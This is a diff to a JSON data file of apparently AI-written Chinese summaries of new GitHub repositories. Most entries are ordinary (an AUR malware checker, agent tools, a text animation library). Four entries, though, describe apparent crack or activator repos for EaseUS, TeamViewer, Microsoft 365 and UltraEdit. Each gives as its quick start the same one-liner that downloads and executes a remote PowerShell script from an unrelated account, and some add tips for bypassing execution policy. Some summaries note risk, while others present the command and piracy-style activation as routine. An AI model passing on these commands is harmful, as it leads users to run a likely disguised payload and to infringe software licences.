+          "你误删重要文件 → 它帮你快速安装EaseUS，立即扫描恢复。",
+          "U盘或硬盘分区显示RAW → 它帮你安装并进行深度扫描，找回数据。",
+          "需要紧急恢复数据 → 它提供简洁安装流程，快速启动数据恢复。",
+          "你想自动化安装EaseUS数据恢复软件 → 它提供一个PowerShell脚本实现静默安装和扫描。"
+        ],
+        "audience": "Windows用户，需要快速安装并使用EaseUS数据恢复软件来挽救丢失数据，或寻求自动化部署解决方案。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64-bit), PowerShell 5.1+, 互联网连接, ~180MB磁盘空间。",
+          "steps": [
+            "打开PowerShell。",
+            "运行 `irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex`。"
+          ],
+          "note": "旧版PowerShell或执行策略限制可参考README中提供的替代命令。"
+        },
+        "competitors": [],
+        "pricing": "EaseUS数据恢复向导本身提供免费试用及付费高级版本。此项目仅提供安装脚本。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目名为“ForbiddenStudentShop”且Topics包含“easeus-activator”、“easeus-key-gen”，可能暗示与盗版相关，存在潜在风险。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，Issue为0，无人维护。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-06-14T06:20:40.257Z"
+    },
+    {
+      "owner": "LavaBladesmanChannel",
+      "repo": "TeamViewer-Remote-Setup",
+      "fullName": "LavaBladesmanChannel/TeamViewer-Remote-Setup",
+      "description": "the world-leading remote desktop and support platform with cross-platform access, file transfer, session recording, and enterprise-grade end-to-end encryption.",
+      "language": "Unknown",
+      "topics": [
+        "anydesk-alternative",
+        "cross-platform-remote",
+        "remote-access",
+        "remote-desktop",
+        "teamviewer",
+        "teamviewer-2025",
+        "teamviewer-2026",
+        "teamviewer-activator",
+        "teamviewer-free",
+        "teamviewer-github",
+        "teamviewer-key-gen",
+        "teamviewer-product-key",
+        "teamviewer-remote",
+        "teamviewer-setup"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-14T00:14:25Z",
+      "url": "https://github.com/LavaBladesmanChannel/TeamViewer-Remote-Setup",
+      "analysis": {
+        "positioning": "自动化 TeamViewer 静默安装与配置，实现无人值守远程访问。",
+        "useCases": [
+          "你需快速部署 TeamViewer → 它帮你一键静默安装并配置无人值守。",
+          "你需批量设置 TeamViewer → 它帮你自动化设置固定密码及公司策略。",
+          "你需为客户或同事提供远程支持 → 它帮你显示连接面板，即刻发起会话。"
+        ],
+        "audience": "IT 管理员、技术支持人员及系统集成商，寻求快速、标准化部署 TeamViewer 解决方案。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位), PowerShell 5.1+, 互联网连接, ~160 MB 磁盘空间。",
+          "steps": [
+            "打开 PowerShell",
+            "运行 `irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex`"
+          ],
+          "note": "若 PowerShell 版本过旧或执行策略受限，可尝试使用 `Invoke-RestMethod` 或 `powershell -ExecutionPolicy Bypass` 命令。"
+        },
+        "competitors": [
+          {
+            "name": "AnyDesk",
+            "method": "独立客户端安装",
+            "models": "N/A",
+            "pricing": "部分免费/付费"
+          },
+          {
+            "name": "Chrome 远程桌面",
+            "method": "浏览器扩展/应用",
+            "models": "N/A",
+            "pricing": "免费"
+          },
+          {
+            "name": "RustDesk",
+            "method": "客户端安装/开源",
+            "models": "N/A",
+            "pricing": "开源/免费"
+          }
+        ],
+        "pricing": "项目脚本本身免费（MIT 许可）。安装的 TeamViewer 软件有免费个人版和付费商业版。",
+        "vibeCodingScore": 1,
+        "vibeCodingReason": "直接执行未知来源的 PowerShell 脚本存在高安全风险，项目非官方，无透明度，信任度极低，不推荐使用。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，无任何 Issue 互动记录，Stars 数量少。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-06-14T06:20:55.039Z"
+    },
+    {
+      "owner": "GatorForceps",
+      "repo": "Microsoft-365-One-Liner",
+      "fullName": "GatorForceps/Microsoft-365-One-Liner",
+      "description": "One-liner to deploy Microsoft 365 -- the complete productivity suite with Word, Excel, PowerPoint, Teams, and 1TB OneDrive cloud storage.",
+      "language": "Unknown",
+      "topics": [
+        "activator",
+        "cloud-office",
+        "free-office",
+        "massgravel",
+        "microsoft-365",
+        "microsoft-365-2025",
+        "microsoft-365-2026",
+        "microsoft-365-free",
+        "microsoft-365-github",
+        "microsoft-365-pro",
+        "microsoft-office-365-activator",
+        "microsoft-office-365-product-key-generator",
+        "microsoft-suite",
+        "microsoft365",
+        "office365",
+        "onedrive",
+        "productivity",
+        "subscription",
+        "windows-10-pro-activator-kms"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-14T00:09:14Z",
+      "url": "https://github.com/GatorForceps/Microsoft-365-One-Liner",
+      "analysis": {
+        "positioning": "一键部署并（可能）激活Microsoft 365全套办公套件的命令行工具。",
+        "useCases": [
+          "你急需一套Word、Excel、PowerPoint和Teams → 它帮你用一行命令快速安装和激活Microsoft 365。",
+          "你不想处理复杂的Microsoft 365安装过程 → 它帮你自动化部署，全程静默，无需手动干预。",
+          "你寻找便捷的Microsoft 365激活方案 → 它帮你通过KMS服务器或其他方式激活，节省时间。"
+        ],
+        "audience": "适合需要在Windows 10/11系统上快速、简化安装和激活Microsoft 365完整套件（含Word、Excel、Teams、OneDrive）的用户。",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位), PowerShell 5.1+, 互联网连接, ~4.5GB可用磁盘空间",
+          "steps": [
+            "打开PowerShell。",
+            "运行命令：`irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex`"
+          ],
+          "note": "若PowerShell版本过旧或执行策略限制，可尝试`powershell -ExecutionPolicy Bypass -Command \"...\"`或`Invoke-RestMethod ... | Invoke-Expression`替代命令。"
+        },
+        "competitors": [
+          {
+            "name": "官方Microsoft 365安装程序",
+            "method": "手动下载、安装，需有效订阅",
+            "models": "Microsoft 365全套",
+            "pricing": "付费订阅"
+          },
+          {
+            "name": "Massgravel/KMS_VL_ALL等KMS激活工具",
+            "method": "通常为单独的激活脚本或工具",
+            "models": "Microsoft Office/Windows",
+            "pricing": "免费（但非官方）"
+          }
+        ],
+        "pricing": "免费（工具本身），但部署的Microsoft 365正版授权通常需付费订阅。本项目可能提供非官方激活选项。",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目提供了一键部署和激活Microsoft 365的极大便利性，README清晰，且包含故障排除。但直接运行来自外部URL的PowerShell脚本，并请求管理员权限，存在潜在的安全风险。同时，其包含的“激活器”功能可能涉及软件授权的灰色地带。",
+        "isVibeCoding": true,
+        "communityActivity": "非常低，Issue均为0，表明项目可能较新或社区互动尚未形成。",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-06-14T06:21:08.952Z"
+    },
+    {
+      "owner": "forestsoulnotice",
+      "repo": "UltraEdit-Pro-Setup",
+      "fullName": "forestsoulnotice/UltraEdit-Pro-Setup",
+      "description": "One-click setup for UltraEdit Pro Setup -- the powerful text and code editor with multi-caret editing, column mode, 100 plus language syntax highlighting, 64-bit large file support, built-in FTP, and a macro scripting engine",
+      "language": "Unknown",
+      "topics": [
+        "code-editor",
+        "column-edit",
+        "ftp-editor",
+        "hex-editor",
+        "large-file-editor",
+        "notepad-alternative",
+        "syntax-highlighting",
+        "text-editor",
+        "ultraedit",
+        "ultraedit-2025",
+        "ultraedit-2026",
+        "ultraedit-free",
+        "ultraedit-github",
+        "ultraedit-pro",
+        "ultraedit-setup"
+      ],
+      "license": "NOASSERTION",
+      "createdAt": "2026-06-14T01:38:32Z",
+      "url": "https://github.com/forestsoulnotice/UltraEdit-Pro-Setup",
+      "analysis": {
+        "positioning": "UltraEdit Pro一键安装激活脚本，Windows专用",
+        "useCases": [
+          "想快速用上UltraEdit Pro → 它提供一键式安装、配置和激活，省去繁琐步骤",
+          "需要高级文本编辑功能（多光标、列模式、内置FTP等）→ 它帮你部署完整Pro版功能并激活",
+          "处理超大文件或多语言代码 → 它支持64位大文件，并提供100+语言语法高亮及性能优化建议"
+        ],
+        "audience": "Windows开发者、高级用户，需要一款功能强大、启动即用的UltraEdit Pro版编辑器",
+        "quickStart": {
+          "prerequisites": "Windows 10/11 (64位), PowerShell 5.1+, 互联网连接, 约200MB磁盘空间",
+          "steps": [
+            "打开PowerShell",
+            "运行命令：`irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex`"
+          ],
+          "note": "如遇策略阻碍，可尝试：`powershell -ExecutionPolicy Bypass -Command \"irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex\"` 或更新PowerShell版本，或使用完整命令：`Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression`。仅限Windows平台。"
+        },
+        "competitors": [
+          {
+            "name": "VS Code",
+            "method": "下载安装包或通过包管理器（如scoop/winget）安装",
+            "models": null,
+            "pricing": "免费"
+          },
+          {
+            "name": "Notepad++",
+            "method": "下载安装包",
+            "models": null,
+            "pricing": "免费"
+          },
+          {
+            "name": "Sublime Text",
+            "method": "下载安装包",
+            "models": null,
+            "pricing": "付费（可免费试用）"
+          }
+        ],
+        "pricing": "免费（脚本本身免费，但其激活的是付费软件UltraEdit Pro）",
+        "vibeCodingScore": 3,
+        "vibeCodingReason": "项目提供了一键激活付费商业软件UltraEdit Pro的功能，可能涉及绕过正常授权机制，存在版权风险。项目本身是简单的PowerShell脚本，但其意图是关键。",
+        "isVibeCoding": true,
+        "communityActivity": "社区活跃度极低，Issue 为空，Star 数少",
+        "category": "CLI工具"
+      },
+      "analyzedAt": "2026-06-14T06:21:22.805Z"
+    },
+    {
+      "owner": "lenucksi",
+      "repo": "aur-malware-check",
+      "fullName": "lenucksi/aur-malware-check",
+      "description": "Detection tools for the June 2026 atomic-lockfile AUR supply-chain attack. Consolidated from community Gists.",
+      "language": "Shell",
+      "topics": [],
+      "license": "Unknown",
+      "createdAt": "2026-06-12T13:17:07Z",
+      "url": "https://github.com/lenucksi/aur-malware-check",
+      "analysis": {
+        "positioning": "Arch AUR供应链攻击恶意软件检测与分析工具。",
+        "useCases": [
+          "你担心AUR包被感染 → 它帮你快速扫描系统，判断是否存在atomic-lockfile或js-digest恶意软件。",
+          "你安装了大量AUR包，不确定是否安全 → 它提供完整扫描，包括历史日志、系统持久化和eBPF Rootkit检查，深入排查。",
+          "你想快速验证已安装包是否在已知受害列表 → 它帮你通过命令行比对已安装包与官方受害包列表。"
+        ],
+        "audience": "Arch Linux用户、开发者和系统管理员，用于快速排查并保护系统免受AUR供应链恶意软件攻击。",
+        "quickStart": {
+          "prerequisites": "Arch Linux系统",
+          "steps": [
+            "chmod +x aur_check.sh",
+            "./aur_check.sh"
+          ],
+          "note": "建议使用`aur_check-v2.sh`以获得更快的扫描速度（1-2秒），其功能与v1版本相同。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "项目目标明确，直接解决Arch AUR供应链攻击的检测痛点。README清晰，提供快速上手指南和优化版本，实用性强，易于理解和使用。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue关闭率较低（2/9），但项目是社区共享成果的整合，功能性强，后续维护和问题响应速度有待观察。",
+        "category": "安全"
+      },
+      "analyzedAt": "2026-06-14T06:21:42.817Z"
+    },
+    {
+      "owner": "omnigent-ai",
+      "repo": "omnigent",
+      "fullName": "omnigent-ai/omnigent",
+      "description": "A meta-harness for all your AI agents.  Omnigent provides a common layer over Claude Code, Codex, Pi, and the agents you write yourself: swap or combine harnesses without rewriting, keep them in check with policies and sandboxing, and collaborate in real time on the same live session, from any device.",
+      "language": "Python",
+      "topics": [],
+      "license": "Apache-2.0",
+      "createdAt": "2026-06-11T12:18:13Z",
+      "url": "https://github.com/omnigent-ai/omnigent",
+      "analysis": {
+        "positioning": "多AI Agent的元管理平台，统一调度，安全协作。",
+        "useCases": [
+          "你需要在多设备上继续AI代理会话 → 它帮你跨设备同步会话，无缝切换。",
+          "你需要让多个AI代理协同工作或互相审查 → 它让你在同一会话中混合使用不同AI代理（Claude, Codex, 自定义）并分配任务。",
+          "你需要与团队成员共享AI代理会话并协作 → 它让你共享会话，共同驱动或旁观代理工作。",
+          "你需要安全隔离地运行AI代理 → 它帮你将代理部署到Modal/Daytona云端沙盒，保障环境安全。",
+          "你需要控制AI代理的行为和成本 → 它提供策略管理，限制代理权限、暂停审批、设置花费上限。"
+        ],
+        "audience": "AI开发者、团队协作用户，需要统一管理、监控、协作AI代理的专业人士。",
+        "quickStart": {
+          "prerequisites": "Python 3.12+",
+          "steps": [
+            "方式一（推荐）：执行 `curl -fsSL https://raw.githubusercontent.com/omnigent-ai/omnigent/main/scripts/install_oss.sh | sh`",
+            "方式二（手动）：`uv tool install omnigent` 或 `pip install omnigent` 或 `brew install omnigent-ai/tap/omnigent`"
+          ],
+          "note": "提供macOS桌面应用下载。"
+        },
+        "competitors": [],
+        "pricing": "核心功能开源免费，基于Apache-2.0许可证。",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "作为AI代理的元管理平台，其核心价值在于对多种代理的整合、策略配置、沙盒部署以及自定义代理编写，这些都涉及深入的工程实践和代码配置，而非简单的自然语言交互。",
+        "isVibeCoding": true,
+        "communityActivity": "Issues开启数远多于关闭数（19/2），活跃度有待提高，新问题响应可能较慢。",
+        "category": "AI Agent"
+      },
+      "analyzedAt": "2026-06-14T06:21:56.793Z"
+    },
+    {
+      "owner": "joeseesun",
+      "repo": "qiaomu-goal-meta-skill",
+      "fullName": "joeseesun/qiaomu-goal-meta-skill",
+      "description": "Turn vague or complex Codex tasks into strong `/goal` commands with outcome, verification, constraints, boundaries, iteration policy, completion evide",
+      "language": "Python",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-06-11T15:10:51Z",
+      "url": "https://github.com/joeseesun/qiaomu-goal-meta-skill",
+      "analysis": {
+        "positioning": "将Agent模糊任务转为可执行Goal指令",
+        "useCases": [
+          "你只想说“帮我做个App” → 它帮你生成可验证、有边界、可迭代的`/goal`指令",
+          "你想让Agent修复Bug/重构代码 → 它帮你细化任务，确保Agent理解验证和暂停条件",
+          "你想用Agent设计UI/原型 → 它帮你将模糊概念转化为结构化的多步骤任务"
+        ],
+        "audience": "面向使用AI Agent（如Codex）进行开发的用户，解决指令模糊导致任务失败的问题",
+        "quickStart": {
+          "prerequisites": "Node.js环境 (用于npx)",
+          "steps": [
+            "安装skill: `npx skills add joeseesun/qiaomu-goal-meta-skill`",
+            "根据提示选择或确认任务选项，获取可复制的`/goal`指令"
+          ],
+          "note": "适用于支持`skills`命令的AI Agent环境"
+        },
+        "competitors": [],
+        "pricing": "免费（MIT开源）",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "精准解决了AI Agent编程中指令模糊的痛点，通过生成结构化、可验证的Goal指令，显著提升Agent任务成功率和效率。",
+        "isVibeCoding": true,
+        "communityActivity": "活跃度较低，目前只有1个开放Issue，没有已关闭Issue，可能项目较为稳定或维护者直接处理。",
+        "category": "AI编程助手"
+      },
+      "analyzedAt": "2026-06-14T06:22:12.713Z"
+    },
+    {
+      "owner": "alchaincyf",
+      "repo": "fanbox",
+      "fullName": "alchaincyf/fanbox",
+      "description": "vibe coding 的驾驶舱：左边文件，右边/下边终端，中间看清每一次改动。 / The cockpit for vibe coding: browse files on the left, command agents on the right, watch every change in between.",
+      "language": "JavaScript",
+      "topics": [
+        "agent",
+        "ai",
+        "claude",
+        "codex",
+        "electron",
+        "file-manager",
+        "local-first",
+        "macos",
+        "terminal",
+        "vibe-coding"
+      ],
+      "license": "MIT",
+      "createdAt": "2026-06-10T01:01:42Z",
+      "url": "https://github.com/alchaincyf/fanbox",
+      "analysis": {
+        "positioning": "AI Agent 代码管理与可视化一体化工具。",
+        "useCases": [
+          "你用AI快速生成大量代码项目 → 它帮你高效管理和定位散落的文件。",
+          "你用AI Agent写代码时多窗口来回切换 → 它提供文件浏览、终端运行、原地预览的一站式工作流。",
+          "你让AI Agent生成或修改文件 → 它实时高亮显示改动，方便追踪和审阅。"
+        ],
+        "audience": "致力于高效管理、调试 AI Agent 生成代码的开发者，尤其偏爱 macOS 下简洁、流畅工作流的用户。",
+        "quickStart": {
+          "prerequisites": "macOS (推荐 Apple Silicon)",
+          "steps": [
+            "访问 GitHub Release 页面下载最新的 .dmg 安装包",
+            "双击 .dmg 文件并拖拽应用到应用程序文件夹完成安装"
+          ],
+          "note": "目前仅支持 macOS 平台"
+        },
+        "competitors": [
+          {
+            "name": "VS Code",
+            "method": "多功能IDE，通过插件集成AI Agent功能",
+            "models": "广泛（如Copilot, Cody等）",
+            "pricing": "免费"
+          },
+          {
+            "name": "Cursor",
+            "method": "AI原生IDE，内置AI聊天与代码生成",
+            "models": "GPT系列，Claude等",
+            "pricing": "免费/付费"
+          }
+        ],
+        "pricing": "免费。",
+        "vibeCodingScore": 5,
+        "vibeCodingReason": "项目明确将自身定位为'vibe coding 的驾驶舱'，通过单窗口集成文件、终端、实时预览，极大地减少了AI Agent开发中多窗口切换的摩擦，让代码追踪与管理直观顺手，高度契合'vibe coding'所追求的流畅与高效体验。",
+        "isVibeCoding": true,
+        "communityActivity": "Star 数 468，Issue 开闭比 12/8，表明项目有一定关注度，且问题得到解决，社区活跃度尚可。",
+        "category": "AI编程助手"
+      },
+      "analyzedAt": "2026-06-14T06:22:34.263Z"
+    },
+    {
+      "owner": "Danilaa1",
+      "repo": "slot-text",
+      "fullName": "Danilaa1/slot-text",
+      "description": "Dependency-free text roll animation for vanilla JS, React, and Vue.",
+      "language": "TypeScript",
+      "topics": [],
+      "license": "MIT",
+      "createdAt": "2026-06-09T16:46:40Z",
+      "url": "https://github.com/Danilaa1/slot-text",
+      "analysis": {
+        "positioning": "无依赖的文本滚动动画，支持JS、React和Vue。",
+        "useCases": [
+          "你点击复制按钮 → 它帮你优雅地展示“已复制”，并自动滚回“复制”。",
+          "你更新UI标签文本 → 它帮你以平滑的滚动动画切换新旧内容。",
+          "你制作微交互提示 → 它帮你为UI元素提供小巧、触感良好的动态文本反馈。"
+        ],
+        "audience": "需要为前端UI元素添加轻量、动态文本滚动效果的Vanilla JS、React或Vue开发者。",
+        "quickStart": {
+          "prerequisites": null,
+          "steps": [
+            "安装 `slot-text` 包：`npm install slot-text`",
+            "引入CSS样式和核心功能，使用 `slotText` 绑定元素或使用React/Vue组件。",
+            "调用 `set()` 进行永久文本更新，或 `flash()` 进行临时滚动反馈。"
+          ],
+          "note": "React和Vue提供专属组件 `<SlotText />`，用法更简洁。"
+        },
+        "competitors": [],
+        "pricing": "免费",
+        "vibeCodingScore": 4,
+        "vibeCodingReason": "无依赖、体积小巧、API设计简洁直观，支持主流前端框架，易于集成，特别适合快速实现精致的UI文本动画效果。",
+        "isVibeCoding": true,
+        "communityActivity": "Issue数量较少（开启2，关闭1），但有处理记录，活跃度尚可。",
+        "category": "前端框架"
+      },
+      "analyzedAt": "2026-06-14T06:22:50.736Z"
     }
   ]
 }
